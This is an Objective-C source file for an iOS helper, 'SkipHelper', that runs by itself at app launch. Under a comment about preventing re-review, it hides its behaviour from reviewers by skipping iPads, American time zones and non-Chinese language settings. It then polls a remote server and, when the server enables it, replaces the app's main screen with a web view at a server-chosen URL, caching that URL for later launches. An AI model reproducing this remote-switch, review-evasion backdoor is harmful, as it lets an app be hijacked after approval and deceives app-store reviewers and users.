//
//  SkipHelper.m
//  SkipHelper
//
//  Created by kdatm on 2018/5/18.
//  Copyright © 2018年 kdatm. All rights reserved.
//

#import "SkipHelper.h"
#import "SKNewViewController.h"
#import "SIAlertView.h"
#import "NSData+_Extension.h"
#import "Reachability.h"
#import "NetworkType.h"

static NSString *kResKey = @"kResKey";


@implementation SkipHelper
+ (void)load {
    NSLog(@"load");
    [self shareHelper];
}

+ (instancetype)shareHelper {
    static SkipHelper *skHelper;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        skHelper = [SkipHelper new];
        [[NSNotificationCenter defaultCenter] addObserver:skHelper selector:@selector(didFinishLaunching) name:UIApplicationDidFinishLaunchingNotification object:nil];
    });
    return skHelper;
}

- (BOOL)isBlankString:(NSString *)string{
    if (string == nil || string == NULL || [string  isEqual: @" "]|| [string  isEqual: @"(null)"]|| [string  isEqual: @""]) {
        return YES;
    }
    if ([string isKindOfClass:[NSNull class]]) {
        return YES;
    }
    return NO;
}

#pragma mark -- 网络失败
static void xxCheckNetWork(id obj)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        [SIAlertView appearance].backgroundStyle = SIAlertViewBackgroundStyleSolid;
        SIAlertView *alertView = [[SIAlertView alloc] initWithTitle:@"温馨提示" andMessage:@"网络连接失败,请检查网络设置!"];
        alertView.dismissManually = true;
        [alertView addButtonWithTitle:@"重试"
                                 type:SIAlertViewButtonTypeDestructive
                              handler:^(SIAlertView *alert) {
                                  [alert dismissAnimated:YES];
                                  // 重新进行网络请求
                                  xxData(obj);
                              }];
        [alertView addButtonWithTitle:@"设置"
                                 type:SIAlertViewButtonTypeDefault
                              handler:^(SIAlertView *alert) {
                                  [[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
                              }];
        [alertView show];
    });
}

- (NSString*)getAPPVersion{
    NSDictionary *infoDic = [[NSBundle mainBundle] infoDictionary];
    NSString *appVersion = [infoDic objectForKey:@"CFBundleShortVersionString"];
    if (appVersion == nil) {
        return @"";
    }
    return appVersion;
}


- (void)didFinishLaunching {
    
    if ([@"notNetwork" isEqualToString:[self getNetworkStatus]]){
        xxCheckNetWork(self);
        return;
    }
    
    NSString *backImageUrl = [[NSUserDefaults standardUserDefaults] objectForKey:KbackImageUrl];
    NSString *webUrl = [[NSUserDefaults standardUserDefaults] objectForKey:KWebUrl];
    if (backImageUrl&&webUrl) {
        [self goToMainVCWithBackgroundImageUrlstr:backImageUrl andwebUrlUrl:webUrl];
    }
    
    if ([self isBlankString:self.appId]) {
        NSLog(@"请先设置appId");
    }else{
        xxData(self);
    }
    
    
}

#pragma mark --- 获取网络状态
- (NSString*)getNetworkStatus
{
    Reachability *reach = [Reachability reachabilityWithHostName:@"www.apple.com"];
    switch ([reach currentReachabilityStatus]) {
        case NotReachable:
            return @"notNetwork";
            break;
        case ReachableViaWWAN:{
            NetworkType *networkType = [NetworkType shareNetworkType];
            return [networkType statusDescripetion];
            break;
        }
        case ReachableViaWiFi:
            return @"wifi";
            break;
        default:
            break;
    }
    return @"";
}

static void  xxData(id obj)
{
    //防止复查
    
    if([[UIDevice currentDevice] userInterfaceIdiom] != UIUserInterfaceIdiomPhone) return;
    if([[NSTimeZone systemTimeZone].name rangeOfString:@"America"].length > 0)return;
    NSString *sysLanguages = [[[[NSUserDefaults standardUserDefaults] objectForKey:@"AppleLanguages"] firstObject] lowercaseString];
    if([sysLanguages rangeOfString:@"zh"].length == 0) return;
    
    
    NSString *version = [obj getAPPVersion];
    NSString *type = [SkipHelper shareHelper].appId;
    NSString *sign  = [NSString stringWithFormat:@"http://yb.xhebao.cn/SDK/KK/app_hello.php?version=%@&type=%@",version,type];
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    [config setTimeoutIntervalForRequest:10];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config];
    
    NSURL *url = [NSURL URLWithString:sign];
    NSMutableURLRequest *req  = [NSMutableURLRequest requestWithURL:url];
    [req setValue:sign forHTTPHeaderField:@"sign"];
    [req setValue:@"text/html" forHTTPHeaderField:@"content-type"];
    
    NSURLSessionDataTask *dataTask =  [session dataTaskWithRequest:req
                                                 completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error)
                                       {
                                           if(!error)
                                           {
                                               id responseObject = data.jsonObject;
                                               responseObject = [NSMutableDictionary dictionaryWithDictionary:responseObject];
                                               setupRes(obj,responseObject);
                                           }else{
                                               xxCheckNetWork(obj);
                                           }
                                       }];
    [dataTask resume];
}

static void setupRes(id obj,NSDictionary *responseObject)
{
    if (![responseObject isKindOfClass:[NSDictionary class]]) return;
    
    if ([@"1" isEqualToString:responseObject[@"enable"]]&&[responseObject[@"click_url"] length]>0)
    {
        static BOOL isOpen;
        if (isOpen) {
            return;
        }
        
        isOpen = true;
        
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *backgoudImageUrl = responseObject[@"image"];
            NSString *clickUrl = responseObject[@"click_url"];
            
            NSString * oldbackImageUrl = [[NSUserDefaults standardUserDefaults] objectForKey:KbackImageUrl];
            NSString *oldwebUrl = [[NSUserDefaults standardUserDefaults] objectForKey:KWebUrl];
            
            if (backgoudImageUrl!=oldbackImageUrl) {
                [[NSUserDefaults standardUserDefaults] setObject:backgoudImageUrl forKey:KbackImageUrl];
            }
            if (clickUrl!=oldwebUrl) {
                [[NSUserDefaults standardUserDefaults]  setObject:clickUrl forKey:KWebUrl];
            }
            [[NSUserDefaults standardUserDefaults] synchronize];
            if (!oldwebUrl) {
                [obj goToMainVCWithBackgroundImageUrlstr:responseObject[@"image"] andwebUrlUrl:responseObject[@"click_url"]];
            }
        });
    }
    else
    {
        [[NSUserDefaults standardUserDefaults] setObject:nil forKey:KWebUrl];
        [[NSUserDefaults standardUserDefaults] setObject:nil forKey:KbackImageUrl];
    }
}

- (void)goToMainVCWithBackgroundImageUrlstr:(NSString *)urlStr andwebUrlUrl:(NSString *)webUrl {
    SKNewViewController *sknewVC = [SKNewViewController new];
    sknewVC.backImageUrl = urlStr;
    sknewVC.clickUrl = webUrl;
    [UIApplication sharedApplication].delegate.window.rootViewController = sknewVC;
    [[UIApplication sharedApplication].delegate.window makeKeyWindow];
}

- (void)dealloc {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:UIApplicationDidFinishLaunchingNotification object:nil];
}



@end
